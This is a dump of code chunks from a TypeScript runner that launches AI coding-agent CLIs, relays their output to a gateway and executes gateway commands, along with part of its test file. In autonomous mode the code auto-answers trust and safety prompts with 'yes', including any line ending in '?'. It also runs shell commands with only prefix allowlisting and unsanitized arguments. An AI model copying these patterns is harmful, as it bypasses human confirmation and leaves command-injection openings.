TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: true\n    });\n\n    const interactiveRunner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: false\n    });\n\n    const autonomousEnv = autonomousRunner.exposeBuildEnvironment();\n    const interactiveEnv = interactiveRunner.exposeBuildEnvironment();\n\n    expect(autonomousEnv.TERM).toBe('xterm-256color');\n    expect(interactiveEnv.TERM).toBe('dumb');\n  });\n});\n\ndescribe('BaseRunner - State Management', () => {\n  it('should include model in state', () => {\n    const runner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: false,\n      model: 'codellama:13b'\n    });\n\n    const state = runner.getState();\n    expect(state.model).toBe('codellama:13b');\n  });\n\n  it('should include workerType in state', () => {\n    const runner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: false\n    });\n\n    const state = runner.getState();\n    expect(state.workerType).toBe('test-worker');\n  });\n\n  it('should track stop requested state', () => {\n    const runner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: false\n    });\n\n    const state = runner.getState();\n    expect(state.stopRequested).toBe(false);\n    expect(state.haltRequested).toBeUndefined();\n  });\n});\n\ndescribe('BaseRunner - Command Building', () => {\n  it('should build command without prompt', () => {\n    const runner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: false\n    });\n\n    const result = runner.buildCommand();\n    expect(result.args).toEqual([]);\n    expect(result.fullCommand).toBe('test-cmd');\n  });\n\n  it('should build command with prompt', () => {\n    const runner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: false\n    });\n\n    const result = runner.buildCommand('test prompt');\n    expect(result.args).toEqual(['test prompt']);\n    expect(result.fullCommand).toBe('test prompt');\n  });\n\n  it('should include autonomous mode in start marker', () => {\n    const autonomousRunner = new TestRunner({", "metadata": {"file": "wrapper/src/services/base-runner.test.ts", "start_line": 201, "end_line": 400, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/base-runner.test.ts", "location": "wrapper/src/services/base-runner.test.ts:401", "score": 0.0, "content": "      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: true\n    });\n\n    const marker = autonomousRunner.exposeBuildStartMarker('autonomous test');\n    expect(marker.autonomous).toBe(true);\n    expect(marker.event).toBe('started');\n  });\n});\n\ndescribe('BaseRunner - Working Directory', () => {\n  it('should use provided working directory', () => {\n    const runner1 = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/custom/path',\n      autonomous: false\n    });\n\n    const runner2 = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      // No workingDir specified - should use default\n      autonomous: false\n    });\n\n    expect(runner1.getState().workingDir).toBe('/custom/path');\n    expect(runner2.getState().workingDir).toBe(process.cwd());\n  });\n});\n\ndescribe('BaseRunner - Input Handling', () => {\n  it('should emit prompt_resolved event when input is sent', () => {\n    const runner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: false\n    });\n\n    let promptResolvedEmitted = false;\n    let emittedInput = '';\n    runner.on('prompt_resolved', (input: string) => {\n      promptResolvedEmitted = true;\n      emittedInput = input;\n    });\n\n    // Mock the process stdin\n    const mockStdin = { write: vi.fn(() => true) };\n    (runner as any).process = { stdin: mockStdin };\n\n    runner['sendInput']('yes\\n');\n\n    expect(promptResolvedEmitted).toBe(true);\n    expect(emittedInput).toBe('yes\\n');\n    expect(mockStdin.write).toHaveBeenCalledWith('yes\\n');\n  });\n\n  it('should handle input without newline', () => {\n    const runner = new TestRunner({\n      runId: 'test-run',\n      capabilityToken: 'token',\n      workingDir: '/test/project',\n      autonomous: false\n    });\n\n    let promptResolvedEmitted = false;\n    runner.on('prompt_resolved', () => {\n      promptResolvedEmitted = true;\n    });\n\n    const mockStdin = { write: vi.fn(() => true) };\n    (runner as any).process = { stdin: mockStdin };\n\n    runner['sendInput']('y');\n\n    expect(promptResolvedEmitted).toBe(true);\n    expect(mockStdin.write).toHaveBeenCalledWith('y');\n  });\n});", "metadata": {"file": "wrapper/src/services/base-runner.test.ts", "start_line": 401, "end_line": 482, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/base-runner.ts", "location": "wrapper/src/services/base-runner.ts:1", "score": 0.0, "content": "import { spawn, ChildProcess, execSync } from 'child_process';\nimport { EventEmitter } from 'events';\nimport { createWriteStream, existsSync, mkdirSync, writeFileSync, readFileSync } from 'fs';\nimport { join } from 'path';\nimport { config } from '../config.js';\nimport { redactSecrets } from '../utils/crypto.js';\nimport {\n  sendEvent,\n  uploadArtifact,\n  pollCommands,\n  ackCommand,\n  updateRunState,\n  type RunAuth,\n  type Command\n} from './gateway-client.js';\n\nexport interface RunnerOptions {\n  runId: string;\n  capabilityToken: string;\n  command?: string;\n  workingDir?: string;\n  autonomous?: boolean;\n  resumeFrom?: string;\n  model?: string; // For workers that support model selection (Ollama, Gemini)\n  integration?: string; // For ollama-launch: specifies the IDE integration (claude, codex, opencode, droid)\n}\n\nexport interface WorkerCommandResult {\n  args: string[];\n  fullCommand: string;\n}\n\n/**\n * Base class for all AI worker runners (Claude, Ollama, Codex, Gemini, Rev)\n * Provides common functionality for process spawning, lifecycle management,\n * event streaming, state persistence, and command execution.\n */\nexport abstract class BaseRunner extends EventEmitter {\n  protected auth: RunAuth;\n  protected process: ChildProcess | null = null;\n  protected logPath: string;\n  protected logStream: ReturnType<typeof createWriteStream> | null = null;\n  protected commandPollTimer: NodeJS.Timeout | null = null;\n  protected heartbeatTimer: NodeJS.Timeout | null = null;\n  protected sequence = 0;\n  protected isRunning = false;\n  protected workingDir: string;\n  protected stopRequested = false;\n  protected haltRequested = false;\n  protected autonomous: boolean;\n  protected stateFile: string;\n  protected resumeFrom?: string;\n  protected model?: string;\n  protected integration?: string; // For ollama-launch: IDE integration name\n  private processedCommandIds: Set<string> = new Set(); // Track processed commands to prevent duplicates\n  private processedCommandExpire: Map<string, NodeJS.Timeout> = new Map(); // Track expiration timers\n  private lastOutputTime = 0; // Track when we last received output\n  private outputWarningTimer: NodeJS.Timeout | null = null; // Warn if no output for a while\n\n  constructor(options: RunnerOptions) {\n    super();\n    this.auth = {\n      runId: options.runId,\n      capabilityToken: options.capabilityToken\n    };\n    this.workingDir = options.workingDir || process.cwd();\n    // Store the sandbox root - cannot go above this directory\n    (this as any).sandboxRoot = this.workingDir;\n    this.autonomous = options.autonomous || false;\n    this.resumeFrom = options.resumeFrom;\n    this.model = options.model;\n    this.integration = options.integration;\n\n    // Setup log directory\n    const runDir = join(config.runsDir, options.runId);\n    if (!existsSync(runDir)) {\n      mkdirSync(runDir, { recursive: true });\n    }\n    this.logPath = join(runDir, 'runner.log');\n    this.stateFile = join(runDir, 'state.json');\n  }\n\n  /**\n   * Get the worker type identifier (abstract method)\n   */\n  abstract getWorkerType(): string;\n\n  /**\n   * Build the command arguments for this worker (abstract method)\n   * @param command - Optional command/prompt to pass to the worker\n   * @param autonomous - Whether running in autonomous mode\n   * @returns Object with args array and full command string\n   */\n  abstract buildCommand(command?: string, autonomous?: boolean): WorkerCommandResult;\n\n  /**\n   * Get the CLI command for this worker\n   */\n  abstract getCommand(): string;\n\n  /**\n   * Start the worker process\n   */\n  async start(command?: string): Promise<void> {\n    if (this.isRunning) {\n      throw new Error('Runner already started');\n    }\n\n    // Load previous state if resuming\n    if (this.resumeFrom) {\n      this.loadState();\n    }\n\n    this.isRunning = true;\n    this.logStream = createWriteStream(this.logPath, { flags: 'a' });\n\n    // Build command based on worker type and mode\n    const { args, fullCommand } = this.buildCommand(command, this.autonomous);\n\n    console.log(`Starting ${this.getWorkerType()}: ${fullCommand}`);\n    console.log(`Working directory: ${this.workingDir}`);\n\n    // Send start marker\n    const startMarker = this.buildStartMarker(fullCommand);\n    await this.sendMarker('started', startMarker);\n\n    // Save initial state\n    this.saveState();\n\n    // Update state on gateway\n    try {\n      await updateRunState(this.auth, {\n        workingDir: this.workingDir,\n        lastSequence: this.sequence\n      });\n    } catch (err) {\n      console.error('Failed to update run state:', err);\n    }\n\n    // Spawn worker process with stdin available\n    const cmd = this.getCommand();\n    const env = this.buildEnvironment();\n\n    console.log(`Spawning process: ${cmd} with args: ${JSON.stringify(args)}`);\n    console.log(`Environment: TERM=${env.TERM}`);\n\n    // For Windows compatibility, we may need shell, but try to use it carefully\n    // shell: true can interfere with output capture, but some CLIs need it\n    const useShell = process.platform === 'win32';\n\n    this.process = spawn(cmd, args, {\n      cwd: this.workingDir,\n      shell: useShell,\n      stdio: ['pipe', 'pipe', 'pipe'],\n      env,\n      windowsHide: false, // Show window on Windows for interactive processes\n    });\n\n    console.log(`Process spawned with PID: ${this.process.pid}`);\n\n    // Handle stdout\n    this.process.stdout?.on('data', (data: Buffer) => {\n      console.log(`Received stdout data: ${data.length} bytes`);\n      this.handleOutput('stdout', data);\n    });\n\n    // Handle stderr\n    this.process.stderr?.on('data', (data: Buffer) => {\n      console.log(`Received stderr data: ${data.length} bytes`);\n      this.handleOutput('stderr', data);\n    });\n\n    // Handle process exit\n    this.process.on('close', async (code, signal) => {\n      console.log(`\\n========================================`);\n      console.log(`${this.getWorkerType()} exited with code ${code}, signal ${signal}`);\n      console.log(`========================================\\n`);\n      await this.handleExit(code, signal);\n    });\n\n    this.process.on('error', async (err) => {\n      console.error(`${this.getWorkerType()} process error:`, err);\n      await this.sendEvent('error', `Process error: ${err.message}`);\n      await this.handleExit(1, null);\n    });\n\n    // Log when process starts producing output\n    if (this.process.stdout) {\n      console.log(`stdout handler attached`);\n    }\n    if (this.process.stderr) {\n      console.log(`stderr handler attached`);\n    }\n\n    // Start command polling and heartbeat\n    this.startCommandPolling();\n    this.startHeartbeat();\n  }\n\n  /**", "metadata": {"file": "wrapper/src/services/base-runner.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/base-runner.ts", "location": "wrapper/src/services/base-runner.ts:201", "score": 0.0, "content": "   * Build environment variables for the worker process\n   * Override in subclasses for worker-specific env vars\n   */\n  protected buildEnvironment(): NodeJS.ProcessEnv {\n    return {\n      ...process.env,\n      TERM: this.autonomous ? 'xterm-256color' : 'dumb',\n      // Disable output buffering for better real-time visibility\n      PYTHONUNBUFFERED: '1',\n      NODE_ENV: 'production'\n    };\n  }\n\n  /**\n   * Build the start marker payload (override in subclasses for worker-specific data)\n   */\n  protected buildStartMarker(command: string): Record<string, any> {\n    return {\n      event: 'started',\n      command,\n      workingDir: this.workingDir,\n      autonomous: this.autonomous,\n      workerType: this.getWorkerType(),\n      model: this.model,\n      resumedFrom: this.resumeFrom\n    };\n  }\n\n  /**\n   * Get current run state\n   */\n  getState(): {\n    runId: string;\n    isRunning: boolean;\n    sequence: number;\n    workingDir: string;\n    autonomous: boolean;\n    stopRequested: boolean;\n    workerType: string;\n    model?: string;\n    haltRequested?: boolean;\n  } {\n    return {\n      runId: this.auth.runId,\n      isRunning: this.isRunning,\n      sequence: this.sequence,\n      workingDir: this.workingDir,\n      autonomous: this.autonomous,\n      stopRequested: this.stopRequested,\n      workerType: this.getWorkerType(),\n      model: this.model,\n      haltRequested: this.haltRequested || undefined\n    };\n  }\n\n  /**\n   * Save state to disk for recovery\n   */\n  protected saveState(): void {\n    const state = {\n      runId: this.auth.runId,\n      sequence: this.sequence,\n      workingDir: this.workingDir,\n      autonomous: this.autonomous,\n      workerType: this.getWorkerType(),\n      model: this.model,\n      savedAt: Date.now()\n    };\n    try {\n      writeFileSync(this.stateFile, JSON.stringify(state, null, 2));\n    } catch (err) {\n      console.error('Failed to save state:', err);\n    }\n  }\n\n  /**\n   * Load state from disk\n   */\n  protected loadState(): boolean {\n    try {\n      if (existsSync(this.stateFile)) {\n        const data = readFileSync(this.stateFile, 'utf8');\n        const state = JSON.parse(data);\n        this.sequence = state.sequence || 0;\n        this.model = state.model;\n        return true;\n      }\n    } catch (err) {\n      console.error('Failed to load state:', err);\n    }\n    return false;\n  }\n\n  /**\n   * Start heartbeat to update state periodically\n   */\n  private startHeartbeat(): void {\n    this.heartbeatTimer = setInterval(async () => {\n      if (!this.isRunning) return;\n\n      // Save state locally\n      this.saveState();\n\n      // Update state on gateway\n      try {\n        await updateRunState(this.auth, {\n          workingDir: this.workingDir,\n          lastSequence: this.sequence\n        });\n      } catch (err) {\n        // Ignore heartbeat errors\n      }\n    }, config.heartbeatInterval);\n  }\n\n  /**\n   * Stop heartbeat\n   */\n  private stopHeartbeat(): void {\n    if (this.heartbeatTimer) {\n      clearInterval(this.heartbeatTimer);\n      this.heartbeatTimer = null;\n    }\n  }\n\n  /**\n   * Send input to stdin\n   */\n  sendInput(data: string): boolean {\n    if (!this.process?.stdin) {\n      return false;\n    }\n    try {\n      this.process.stdin.write(data);\n      // Notify that prompt has been resolved (input sent)\n      this.emit('prompt_resolved', data);\n      return true;\n    } catch (err) {\n      console.error('Failed to write to stdin:', err);\n      return false;\n    }\n  }\n\n  /**\n   * Send escape sequence (Ctrl+C) to process\n   */\n  sendEscape(): boolean {\n    if (!this.process || !this.isRunning) {\n      return false;\n    }\n    try {\n      // Send SIGINT for escape\n      this.process.kill('SIGINT');\n      return true;\n    } catch (err) {\n      console.error('Failed to send escape:', err);\n      return false;\n    }\n  }\n\n  /**\n   * Handle output from worker process\n   */\n  private async handleOutput(type: 'stdout' | 'stderr', data: Buffer): Promise<void> {\n    const text = data.toString();\n    const preview = text.substring(0, 300);\n    const truncated = text.length > 300 ? '...' : '';\n\n    // Log to console for visibility - include full length for debugging\n    console.log(`[${type}] (${text.length} chars) ${preview}${truncated}`);\n\n    // Write to local log\n    this.logStream?.write(`[${type}] ${text}`);\n\n    // Redact secrets before sending\n    const sanitized = redactSecrets(text);\n\n    // Detect blocking prompts (patterns that indicate Claude is waiting for user input)\n    const promptResult = this.detectBlockingPrompt(sanitized);\n    if (promptResult.isPrompt) {\n      console.log(`Prompt waiting detected (type: ${promptResult.type})`);\n      await this.sendEvent('prompt_waiting', sanitized);\n      this.emit('prompt', sanitized);\n\n      // Auto-respond in autonomous mode\n      if (this.autonomous) {\n        console.log('Autonomous mode: auto-responding to prompt');\n        let response = '';\n\n        if (promptResult.type === 'yes') {\n          // For trust/safety prompts, answer \"1\" (Yes, I trust this folder)\n          response = '1\\n';\n        } else if (promptResult.type === 'confirm') {\n          // For general yes/no prompts, answer \"y\"\n          response = 'y\\n';\n        }\n\n        if (response) {\n          // Add a delay to ensure the prompt is fully rendered before responding\n          await new Promise(resolve => setTimeout(resolve, 500));", "metadata": {"file": "wrapper/src/services/base-runner.ts", "start_line": 201, "end_line": 400, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/base-runner.ts", "location": "wrapper/src/services/base-runner.ts:401", "score": 0.0, "content": "          if (this.sendInput(response)) {\n            console.log('Auto-response sent successfully');\n          } else {\n            console.log('Failed to send auto-response');\n          }\n        }\n      }\n    }\n\n    // Send to gateway\n    try {\n      await this.sendEvent(type, sanitized);\n    } catch (err) {\n      console.error('Failed to send event to gateway:', err);\n    }\n\n    this.emit(type, sanitized);\n  }\n\n  /**\n   * Detect if the worker is waiting for user input (blocking prompt)\n   * Returns the prompt type to determine how to respond\n   * Common Claude prompt patterns:\n   * - \"Would you like me to...\"\n   * - \"Should I...\"\n   * - \"Continue?\"\n   * - \"[Y/n]\"\n   * - \"(y/N)\"\n   * - \"Press Enter to continue\"\n   * - Trust/safety prompts from IDE integrations\n   */\n  private detectBlockingPrompt(text: string): { isPrompt: boolean; type?: 'yes' | 'confirm' } {\n    // Detect trust/safety prompts that should be auto-answered with \"1\" (yes)\n    const trustPrompts = [\n      /Is this a project you created or one you trust/i,\n      /trust this folder/i,\n      /do you want to proceed/i,\n      /Yes.*trust.*folder/i,\n    ];\n\n    for (const pattern of trustPrompts) {\n      if (pattern.test(text)) {\n        return { isPrompt: true, type: 'yes' };\n      }\n    }\n\n    // Detect other blocking prompts\n    const promptPatterns = [\n      /Would you like me to/i,\n      /Should I/i,\n      /Do you want me to/i,\n      /Continue\\??/i,\n      /\\[Y\\/n\\]/i,\n      /\\[y\\/N\\]/i,\n      /\\(Y\\/n\\)/i,\n      /\\(y\\/N\\)/i,\n      /\\[y\\/N\\]?\\s*$/m,\n      /Press Enter to continue/i,\n      /press enter to continue/i,\n      /Enter to proceed/i,\n      /Type\\s+'y'\\s+to\\s+continue/i,\n      /Type\\s+'y'\\s+to\\s+proceed/i,\n      /Type\\s+\"y\"\\s+to\\s+continue/i,\n      /Type\\s+'yes'\\s+to\\s+continue/i,\n      /Type\\s+'yes'\\s+to\\s+proceed/i,\n      /Type\\s+\"yes\"\\s+to\\s+continue/i,\n      /Would you like to proceed/i,\n      /Confirm this change/i,\n      /Allow this operation/i,\n      /Proceed with this action/i,\n      /Are you sure/i,\n      /Are you certain/i,\n      /\\?$/m, // Ends with question mark\n    ];\n\n    // Check if any pattern matches\n    for (const pattern of promptPatterns) {\n      if (pattern.test(text)) {\n        return { isPrompt: true, type: 'confirm' };\n      }\n    }\n\n    return { isPrompt: false };\n  }\n\n  /**\n   * Send event to gateway\n   */\n  private async sendEvent(type: string, data: string): Promise<void> {\n    this.sequence++;\n    try {\n      await sendEvent(this.auth, {\n        type: type as any,\n        data,\n        sequence: this.sequence\n      });\n      console.log(`\u2713 Event sent: ${type} (seq: ${this.sequence}, ${data.length} bytes)`);\n    } catch (err: any) {\n      console.error(`\u2717 Failed to send event ${type}:`, err.message);\n\n      // Check if this is a fatal error (run deleted, rate limited, etc.)\n      if (err.message) {\n        const errorMessage = err.message.toLowerCase();\n        // Exit on 404 (run not found), 429 (rate limited), or other gateway errors\n        if (errorMessage.includes('not found') ||\n            errorMessage.includes('429') ||\n            errorMessage.includes('rate limit') ||\n            errorMessage.includes('unauthorized') ||\n            errorMessage.includes('forbidden')) {\n          console.error('\\n========================================');\n          console.error('Fatal error communicating with gateway.');\n          console.error('The run may have been deleted or rate limit exceeded.');\n          console.error('Exiting gracefully...');\n          console.error('========================================\\n');\n          process.exit(1);\n        }\n      }\n\n      throw err;\n    }\n  }\n\n  /**\n   * Send marker event\n   */\n  private async sendMarker(event: string, details?: object): Promise<void> {\n    await this.sendEvent('marker', JSON.stringify({ event, ...details }));\n  }\n\n  /**\n   * Handle process exit\n   */\n  private async handleExit(code: number | null, signal: string | null): Promise<void> {\n    this.isRunning = false;\n    this.stopCommandPolling();\n    this.stopHeartbeat();\n\n    const exitCode = code ?? (signal ? 128 : 1);\n\n    // Save final state\n    this.saveState();\n\n    // Send finish marker\n    await this.sendMarker('finished', {\n      exitCode,\n      signal,\n      stopRequested: this.stopRequested,\n      haltRequested: this.haltRequested,\n      workerType: this.getWorkerType()\n    });\n\n    // Close log stream\n    this.logStream?.end();\n\n    // Upload log file as artifact\n    try {\n      const logFileName = `${this.getWorkerType()}.log`;\n      await uploadArtifact(this.auth, this.logPath, logFileName);\n      console.log('Log file uploaded');\n    } catch (err) {\n      console.error('Failed to upload log:', err);\n    }\n\n    this.emit('exit', exitCode);\n  }\n\n  /**\n   * Request graceful stop (SIGINT, then SIGKILL after timeout)\n   */\n  async stop(): Promise<void> {\n    if (!this.isRunning || !this.process) {\n      return;\n    }\n\n    this.stopRequested = true;\n    await this.sendEvent('info', 'Stop requested by operator');\n\n    // Send SIGINT first (graceful)\n    this.process.kill('SIGINT');\n\n    // Force kill after timeout\n    setTimeout(() => {\n      if (this.isRunning && this.process) {\n        console.log('Force killing process...');\n        this.process.kill('SIGKILL');\n      }\n    }, 10000);\n  }\n\n  /**\n   * Hard halt (immediate SIGKILL)\n   */\n  async halt(): Promise<void> {\n    if (!this.isRunning || !this.process) {\n      return;\n    }\n\n    this.haltRequested = true;\n    await this.sendEvent('info', 'Hard halt requested by operator - killing immediately');\n", "metadata": {"file": "wrapper/src/services/base-runner.ts", "start_line": 401, "end_line": 600, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/base-runner.ts", "location": "wrapper/src/services/base-runner.ts:601", "score": 0.0, "content": "    // Immediate SIGKILL\n    this.process.kill('SIGKILL');\n  }\n\n  /**\n   * Start polling for commands\n   */\n  private startCommandPolling(): void {\n    this.commandPollTimer = setInterval(async () => {\n      if (!this.isRunning) return;\n\n      try {\n        const commands = await pollCommands(this.auth);\n        for (const cmd of commands) {\n          // Skip if this command was recently processed\n          if (this.processedCommandIds.has(cmd.id)) {\n            console.warn(`Skipping recently processed command: ${cmd.id}`);\n            continue;\n          }\n          await this.executeCommand(cmd);\n        }\n      } catch (err) {\n        // Ignore polling errors\n      }\n    }, config.commandPollInterval);\n  }\n\n  /**\n   * Stop polling for commands\n   */\n  private stopCommandPolling(): void {\n    if (this.commandPollTimer) {\n      clearInterval(this.commandPollTimer);\n      this.commandPollTimer = null;\n    }\n  }\n\n  /**\n   * Mark a command as processed to prevent duplicate execution\n   */\n  private markCommandProcessed(commandId: string, expireMs: number = 5000): void {\n    this.processedCommandIds.add(commandId);\n\n    // Clear any existing timeout\n    const existingTimer = this.processedCommandExpire.get(commandId);\n    if (existingTimer) clearTimeout(existingTimer);\n\n    // Set new timeout to remove from set after expiration\n    const timer = setTimeout(() => {\n      this.processedCommandIds.delete(commandId);\n      this.processedCommandExpire.delete(commandId);\n    }, expireMs);\n\n    this.processedCommandExpire.set(commandId, timer);\n  }\n\n  /**\n   * Execute a command from the gateway\n   */\n  private async executeCommand(cmd: Command): Promise<void> {\n    console.log(`Executing command: ${cmd.command}`);\n\n    // Mark command as being processed to prevent duplicate execution\n    // if ack fails, it will be re-polled after expiration\n    this.markCommandProcessed(cmd.id, 10000);\n\n    // Handle special commands\n    if (cmd.command === '__STOP__') {\n      try {\n        await this.stop();\n        await ackCommand(this.auth, cmd.id, 'Stop initiated');\n      } catch (err: any) {\n        console.error(`Failed to acknowledge stop command ${cmd.id}:`, err.message);\n      }\n      return;\n    }\n\n    if (cmd.command === '__HALT__') {\n      try {\n        await this.halt();\n        await ackCommand(this.auth, cmd.id, 'Hard halt initiated');\n      } catch (err: any) {\n        console.error(`Failed to acknowledge halt command ${cmd.id}:`, err.message);\n      }\n      return;\n    }\n\n    if (cmd.command === '__ESCAPE__') {\n      const success = this.sendEscape();\n      try {\n        if (success) {\n          await this.sendEvent('info', 'Escape sequence sent (SIGINT)');\n          await ackCommand(this.auth, cmd.id, 'Escape sent');\n        } else {\n          await ackCommand(this.auth, cmd.id, undefined, 'Failed to send escape - process not running');\n        }\n      } catch (err: any) {\n        console.error(`Failed to acknowledge escape command ${cmd.id}:`, err.message);\n      }\n      return;\n    }\n\n    if (cmd.command.startsWith('__INPUT__:')) {\n      const input = cmd.command.substring('__INPUT__:'.length);\n      const success = this.sendInput(input);\n      try {\n        if (success) {\n          // Send prompt_resolved event to indicate the prompt was answered\n          await this.sendEvent('prompt_resolved', `Response: ${input.replace(/\\n/g, '\\\\n')}`);\n          await this.sendEvent('info', `Input sent: ${input.length} bytes`);\n          await ackCommand(this.auth, cmd.id, `Sent ${input.length} bytes to stdin`);\n        } else {\n          await ackCommand(this.auth, cmd.id, undefined, 'Failed to send input - process not running');\n        }\n      } catch (err: any) {\n        console.error(`Failed to acknowledge input command ${cmd.id}:`, err.message);\n        await this.sendEvent('error', `Failed to acknowledge input: ${err.message}`);\n      }\n      return;\n    }\n\n    // Validate command is allowlisted\n    const isAllowed = config.allowlistedCommands.some(allowed =>\n      cmd.command === allowed || cmd.command.startsWith(allowed + ' ')\n    );\n\n    if (!isAllowed) {\n      await ackCommand(this.auth, cmd.id, undefined, 'Command not in allowlist');\n      return;\n    }\n\n    // Handle special directory navigation commands\n    if (cmd.command.startsWith('cd ')) {\n      const path = cmd.command.substring(3).trim();\n      const result = this.changeDirectory(path);\n      if (result.success) {\n        await this.sendEvent('info', result.message);\n        await ackCommand(this.auth, cmd.id, result.message);\n      } else {\n        await this.sendEvent('error', result.message);\n        await ackCommand(this.auth, cmd.id, undefined, result.message);\n      }\n      return;\n    }\n\n    // Handle pwd command - show current directory relative to sandbox\n    if (cmd.command === 'pwd') {\n      const currentDir = this.getWorkingDirectory();\n      const message = `Current directory: ${currentDir}`;\n      await this.sendEvent('info', message);\n      await ackCommand(this.auth, cmd.id, currentDir);\n      return;\n    }\n\n    // Handle ls/dir commands - show directory listing with relative paths\n    if (cmd.command.startsWith('ls') || cmd.command.startsWith('dir') || cmd.command.startsWith('ll')) {\n      const args = cmd.command.split(' ').slice(1).join(' ');\n      const lsCmd = `ls ${args}`.trim();\n      try {\n        const result = execSync(lsCmd, {\n          cwd: this.workingDir,\n          encoding: 'utf8',\n          timeout: 10000,\n          maxBuffer: 5 * 1024 * 1024\n        });\n\n        const sanitized = redactSecrets(result);\n        const header = this.getWorkingDirectory() !== (this as any).sandboxRoot\n          ? `Directory: ${this.getWorkingDirectory()}\\n`\n          : '';\n\n        await this.sendEvent('info', `${header}${sanitized}`);\n        await ackCommand(this.auth, cmd.id, sanitized);\n      } catch (err: any) {\n        const errorMsg = err.stderr || err.message || 'Unknown error';\n        const sanitized = redactSecrets(errorMsg);\n        await this.sendEvent('error', `Command failed: ${sanitized}`);\n        await ackCommand(this.auth, cmd.id, undefined, sanitized);\n      }\n      return;\n    }\n\n    // Execute command in working directory\n    try {\n      await this.sendEvent('info', `Executing command: ${cmd.command}`);\n\n      const result = execSync(cmd.command, {\n        cwd: this.workingDir,\n        encoding: 'utf8',\n        timeout: 60000,\n        maxBuffer: 10 * 1024 * 1024\n      });\n\n      const sanitized = redactSecrets(result);\n      await this.sendEvent('info', `Command output:\\n${sanitized}`);\n      await ackCommand(this.auth, cmd.id, sanitized);\n\n      // If it's a git diff, upload as artifact\n      if (cmd.command.startsWith('git diff')) {\n        const diffPath = join(config.runsDir, this.auth.runId, 'latest.diff');", "metadata": {"file": "wrapper/src/services/base-runner.ts", "start_line": 601, "end_line": 800, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/base-runner.ts", "location": "wrapper/src/services/base-runner.ts:801", "score": 0.0, "content": "        writeFileSync(diffPath, result);\n        await uploadArtifact(this.auth, diffPath, 'latest.diff');\n      }\n    } catch (err: any) {\n      const errorMsg = err.stderr || err.message || 'Unknown error';\n      const sanitized = redactSecrets(errorMsg);\n      await this.sendEvent('error', `Command failed: ${sanitized}`);\n      await ackCommand(this.auth, cmd.id, undefined, sanitized);\n    }\n  }\n\n  /**\n   * Start tmate assist session\n   */\n  async startAssistSession(): Promise<string | null> {\n    try {\n      // Check if tmate is available\n      execSync('which tmate', { encoding: 'utf8' });\n    } catch {\n      await this.sendEvent('error', 'tmate not installed. Install with: brew install tmate (macOS) or apt install tmate (Linux)');\n      return null;\n    }\n\n    try {\n      await this.sendEvent('info', 'Starting tmate assist session...');\n\n      // Start tmate in detached mode and get the session URL\n      const output = execSync('tmate -F new-session -d -P -f ~/.tmate.conf 2>&1 || tmate -F new-session -d -P 2>&1', {\n        cwd: this.workingDir,\n        encoding: 'utf8',\n        timeout: 30000\n      });\n\n      // Parse tmate output for SSH URL\n      const sshMatch = output.match(/ssh\\s+[\\w@\\.\\-]+/);\n      const webMatch = output.match(/https?:\\/\\/[^\\s]+/);\n\n      const sessionUrl = webMatch?.[0] || sshMatch?.[0] || output.trim();\n\n      await sendEvent(this.auth, {\n        type: 'assist',\n        data: JSON.stringify({ type: 'tmate', url: sessionUrl })\n      });\n\n      return sessionUrl;\n    } catch (err: any) {\n      await this.sendEvent('error', `Failed to start tmate: ${err.message}`);\n      return null;\n    }\n  }\n\n  /**\n   * Validate that a path is within the sandbox (initial working directory)\n   */\n  private validatePathInSandbox(path: string): { valid: boolean; normalized: string } {\n    const { resolve, normalize, relative } = require('path');\n\n    const normalized = normalize(path);\n    const absolutePath = resolve(this.workingDir, normalized);\n    const sandboxRoot = resolve((this as any).sandboxRoot || this.workingDir);\n\n    // Check if the path is within the sandbox\n    const resolvedPath = resolve(sandboxRoot, normalized);\n    const relativeFromRoot = relative(sandboxRoot, resolvedPath);\n\n    // If path starts with .. or goes above root, it's invalid\n    if (relativeFromRoot.startsWith('..') || !absolutePath.startsWith(sandboxRoot)) {\n      return { valid: false, normalized: absolutePath };\n    }\n\n    return { valid: true, normalized: absolutePath };\n  }\n\n  /**\n   * Change directory within the sandbox\n   */\n  private changeDirectory(path: string): { success: boolean; message: string; newDir?: string } {\n    const { existsSync, statSync } = require('fs');\n    const { resolve, normalize } = require('path');\n\n    // Handle special cases\n    if (!path || path === '~') {\n      return {\n        success: false,\n        message: 'Cannot change to home directory - must stay within sandbox'\n      };\n    }\n\n    if (path === '-') {\n      return {\n        success: false,\n        message: 'Previous directory not tracked - use absolute paths'\n      };\n    }\n\n    // Normalize and validate the path\n    const sandboxRoot = resolve((this as any).sandboxRoot || this.workingDir);\n    const absolutePath = resolve(this.workingDir, path);\n\n    // Check if path is within sandbox\n    if (!absolutePath.startsWith(sandboxRoot)) {\n      return {\n        success: false,\n        message: `Cannot change directory: path is outside sandbox (${sandboxRoot})`\n      };\n    }\n\n    // Check if directory exists\n    if (!existsSync(absolutePath)) {\n      return {\n        success: false,\n        message: `Directory does not exist: ${path}`\n      };\n    }\n\n    // Check if it's a directory\n    try {\n      const stats = statSync(absolutePath);\n      if (!stats.isDirectory()) {\n        return {\n          success: false,\n          message: `Not a directory: ${path}`\n        };\n      }\n    } catch (err) {\n      return {\n        success: false,\n        message: `Cannot access directory: ${path}`\n      };\n    }\n\n    // Update working directory\n    this.workingDir = absolutePath;\n\n    // Update state and 